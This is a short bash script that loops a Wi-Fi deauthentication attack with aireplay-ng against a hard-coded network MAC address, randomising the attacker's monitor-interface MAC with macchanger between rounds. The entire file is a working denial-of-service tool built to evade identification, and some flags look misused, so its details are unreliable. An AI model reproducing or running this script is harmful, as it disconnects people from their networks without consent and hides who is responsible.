#!/bin/bash
while true
do

	aireplay-ng -0 1 -e 44:00:4D:10:9C:84 wlp1s0mon | grep "DeAuth"
	ifconfig wlp1s0mon down
	macchanger -r wlp1s0mon up
	sleep 5
done
